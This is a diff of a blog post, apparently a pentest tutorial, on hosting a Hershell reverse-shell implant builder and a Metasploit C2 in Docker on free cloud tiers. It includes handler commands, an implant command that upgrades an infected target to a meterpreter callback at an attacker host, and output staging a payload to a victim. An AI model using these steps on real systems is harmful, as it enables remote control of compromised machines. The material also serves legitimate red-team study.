@@ -1,9 +1,9 @@
 ---
 layout: post
-title: "Using Docker to host a cloud hershell implant listener and a Metasploit C2"
-description: "A look into deploying offensive tooling in a cloud environment, for free!"
-thumbnail: tasks
-categories: cloud, offensive
+title: "Cloud reverse-shell: Hershell, Metasploit and Docker"
+description: "Offensive cloud tips: Deploying offensive tooling in a golang cloud environment, for free!"
+thumbnail: chess-knight
+categories: offensive
 excerpt_separator: <!--more-->
 published: true
 tags:
@@ -15,31 +15,35 @@ tags:
   - gce
   - pentest
   - golang
+
+
 ---
-
-
 
 ## Using Docker to host a cloud hershell implant listener and a Metasploit C2
 
 ------
-Did you ever wonder how to get a free implant listener server available all the time in a very stable infrastructure?
+
+In the following article we'll be deploying Hershell, a minimal golang reverse shell, and its C2 using Docker to host it on a cloud provider's infrastructure.  
+One of the many powers of golang is it's cross platform capabilities. Since the codebase is minimal, we'll see how to use a container to host our C2.
 
 <!--more-->
 
 ------
+
 # Goal
 
-We want to use Docker to build and fresh [hershell](https://github.com/lesnuages/hershell) implant and easily distribute it.  
+We want to use Docker to build a fresh [hershell](https://github.com/lesnuages/hershell) implant and easily distribute it.  
 
-[Hershell](https://github.com/lesnuages/hershell) comes with the ability to upgrade the infected target to a `meterpreter` implant or inject shellcode. We'll also be using Docker to host our second stage Metasploit C2 (C3 in this article)
+[Hershell](https://github.com/lesnuages/hershell) comes with the ability to upgrade the infected target to a `meterpreter` implant or inject shellcode directly in memory. We'll also be using Docker to host our second stage Metasploit C2 (C3 in this article)
 
 Once done, generating, sharing and managing the implant should be a fast and cloud-native process.
 
+Deploying a server to catch the reverse callback will should be fast and clean.  
 # Requirements
 
 You'll need a `docker` environment [installed](https://docs.docker.com/install/), and some place to host your C2 and C3.  
-Since we're using containers, you can very well try this on your local machine.
-I recommend looking into [free tiers](https://github.com/ripienaar/free-for-dev) from providers such as AWS, Azure or Google Cloud Engine, as you can hardly beat their datacenter Internet speed.  
+Since we're using containers, you can very well try this on your local machine.  
+I recommend looking into [free tiers](https://github.com/ripienaar/free-for-dev) from providers such as AWS, Azure or Google Cloud Engine, as you can hardly beat their datacenter Internet speed.
 
 Some basic UNIX and Docker knowledge is expected.
 
@@ -47,7 +51,8 @@ Some basic UNIX and Docker knowledge is expected.
 
 
 Hershell aims to be the opposite of a feature-rich implant.  
-It is elegant in its simplicity, written in golang making it cross-platform. Once infected, the target can be upgraded to a meterpreter shell with multiple egress methods.  
+It is elegant in its simplicity, written in golang making it cross-platform.  
+Once infected, the target can be upgraded to a meterpreter shell with multiple egress methods.  
 
 The meterpreter staging currently supports the following payloads :
 
@@ -58,7 +63,7 @@ The meterpreter staging currently supports the following payloads :
 * `windows/meterpreter/reverse_https`
 * `windows/x64/meterpreter/reverse_https`
 
-Hershell generates a TLS certificate/key thats embedded in the implant to cypher communications, so we'll want to easily recover those too.
+Hershell generates a TLS certificate/key thats to cypher communications with the implant, so we'll want to easily recover those too.
 
 
 # Steps
@@ -67,18 +72,22 @@ Hershell generates a TLS certificate/key thats embedded in the implant to cypher
 
 ### Building
 
+We'll create the Dockerfile in two steps.  
+First, we'll build hershell and its server using the provided Makefile.  
+Second, we'll launch a minimal HTTP server to easily fetch the generated binaries and cert.
+
 #### Base
 
 We'll be building the hershell implants using a `golang:alpine` base to keep it small (OS is ~20MB).  
 
-A quick note about golang containers, there is a `/go` root dir where `bin` is the compiled binaries destination folder, and the `src` folder populated with source code.  
+A quick note about golang containers, there is a `/go` root dir where `/go/bin/` is the compiled binaries destination folder, and the `/go/src/` folder populated with source code.  
 
 Since hershell is hosted on github, we can simply tell golang to fetch it using the `go get -u github.com/lesnuages/hershell` command.
 
 Finally, we'll need the `make`, `git` and `openssl` packages too.  
 
 
-```
+```bash
 FROM golang:alpine
 
 RUN apk add --update make git openssl \
@@ -183,7 +192,9 @@ The `nmap` package is also pre installed, meaning we have `ncat` in the containe
 
 ### Launch
 
-We're going to upgrade our hershell to a meterpreter session, using a dockerized Metasploit console.
+We're going to upgrade our hershell to a meterpreter session, using a dockerized Metasploit console.  
+
+Contrary to the previous method, MSF will only need our `server.key` file.
 
 
 To launch our `metasploit` container, we simply do:
@@ -197,7 +208,8 @@ We're using the `docker run` line from the [Docker hub page](https://hub.docker.
 
 ### Use
 
-Once the container is up and running, you'll land in a classic shell. You'll find all the classic `msf` framework tools.
+Once the container is up and running, you'll land in a bash shell.  
+You'll find all the classic `msf` framework tools.
 
 ![msf](https://github.com/khast3x/khast3x.github.io/blob/master/assets/demo/hershell_msf_binaries.png?raw=true)
 We'll launch the `msfconsole` and let it load. Once you're greeted with the prompt, we'll need to retrieve our `server.key`.
@@ -212,7 +224,7 @@ msf5 > wget http://DOCKER-IP:8000/server.key
 
 Next, we're preparing our handler. I'll be using the `reverse_https` method.
 
-```
+```bash
 msf5 > use exploit/multi/handler
 msf5 > set payload windows/x64/meterpreter/reverse_https
 msf5 > set lhost DOCKER-IP
@@ -223,13 +235,14 @@ msf5 > exploit -j
 ```
 
 In your hershell console, simply type:
-```
-[hershell]> meterpreter https DOCKER-IP:8443
+
+```bash
+[hershell]> meterpreter https YOUR-DOCKER-IP:8443
 ```
 
 And hopefully, you'll be seeing this in your `msfconsole`
 
-```
+```bash
 [*] Started HTTPS reverse handler on https://0.0.0.0:8443
 cleear
 [*] https://DOCKER-IP:8443 handling request from VICTIM-IP; (UUID: q4jynvuf) Staging x64 payload (207449 bytes) ...
